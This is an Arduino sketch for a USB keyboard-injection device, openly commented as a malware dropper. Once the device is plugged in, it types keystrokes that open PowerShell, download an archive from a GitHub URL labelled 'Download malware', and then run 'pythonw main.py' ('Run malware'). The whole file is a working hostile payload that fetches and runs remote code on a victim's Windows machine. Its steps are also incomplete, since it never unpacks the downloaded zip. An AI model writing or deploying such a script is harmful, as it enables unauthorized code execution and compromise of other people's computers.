#include <Keyboard.h>

void setup() {
  // Start the keyboard class
  Keyboard.begin();

  delay(1000); // maybe delete

  // Open run window (Windows + r)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(10);
  Keyboard.releaseAll();

  delay(200);

  // Run windows powershell
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  // Wait for command prompt to open
  delay(1000);
  
  // Download malware
  Keyboard.print("wget https://github.com/The-TT-Hacker/usb-rubber-ducky/archive/master.zip");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  //Wait for program to download
  delay(5000);

  // Run malware

  Keyboard.print("pythonw main.py");
}

void loop() {

}
